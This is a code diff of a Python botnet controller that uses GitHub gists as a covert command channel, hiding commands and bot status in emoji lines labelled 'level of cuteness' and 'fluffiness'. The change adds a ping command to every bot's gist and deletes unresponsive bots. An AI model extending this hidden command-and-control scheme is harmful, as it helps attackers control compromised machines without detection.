@@ -5,9 +5,9 @@ from Controller import gist
 from Controller import emojis
 
 
-def reset_bots(gist_api, bot_list):
+def send(gist_api, bot_list):
     """
-    Add reset emoji to all the bots' status (level of cuteness).
+    Send ping command to all the bots. And add reset emoji to all the bots' status (level of cuteness).
 
     :param gist_api:
     :param bot_list:
@@ -16,21 +16,25 @@ def reset_bots(gist_api, bot_list):
     # Reset status code (level of cuteness)
     bot_list_content = gist.get_raw(gist_api, bot_list)
     lines = bot_list_content.split('\n')
+    print("SENDING PING TO BOTS", file=sys.stderr, end="")
     for line in lines:
         if not line.startswith('###'):
             continue
 
-        # Change level of cuteness to reset emoji
+        print(".", file=sys.stderr, end="")
         filename = line.split("(")[1].split("#")[1].rstrip(')')
-        bot_content = gist.get_raw(gist_api, filename)
-        content_split = bot_content.split('\n')
+        bot_post_content = gist.get_raw(gist_api, filename)
+        content_split = bot_post_content.split('\n')
+        # Change status to reset
         content_split[1] = "### Level of cuteness " + random.choice(emojis.status_code['reset'])
+        # Send ping command
+        content_split[2] = "### Level of fluffiness " + emojis.command['ping']
         gist.update_gist(gist_api, filename, "\n".join(content_split))
 
-    print("Reset done ({} bots in the list)".format(len(lines) - 1))
+    print(file=sys.stderr)
 
 
-def check_bots(gist_api, bot_list):
+def check(gist_api, bot_list):
     """
     Check status code (level of cuteness) -> if still reset -> kill them
 
@@ -40,8 +44,8 @@ def check_bots(gist_api, bot_list):
     """
     new_bot_list_split = []
     bot_list_content = gist.get_raw(gist_api, bot_list)
-    lines = bot_list_content.split('\n')
-    for line in lines:
+    bot_list_split = bot_list_content.split('\n')
+    for line in bot_list_split:
         if not line.startswith('###'):
             new_bot_list_split.append(line)
             continue
@@ -52,13 +56,15 @@ def check_bots(gist_api, bot_list):
         status = bot_content.split('\n')[1].split("cuteness")[-1].strip()
         if status in emojis.status_code['reset']:
             # DEAD -> KILL IT (remove post, do not add to bot list)
-            print("KILLING {}".format(filename), file=sys.stderr)
+            print("REMOVING {}".format(filename), file=sys.stderr)
             gist_api.delete_gist(gist_id=line.split("(")[1].split("#")[0].split("/")[-1])
         else:
             new_bot_list_split.append(line)
 
-        # Update bot list
+    # Update bot list
+    if len(new_bot_list_split) != len(bot_list_split):
         gist.update_gist(gist_api, bot_list, "\n".join(new_bot_list_split))
-        print("ALL DEAD GONE ({} still alive)".format(len(new_bot_list_split) - 1))
+
+    print("##### {} BOTS STILL ALIVE #####".format(len(new_bot_list_split) - 1), file=sys.stderr)
 
 
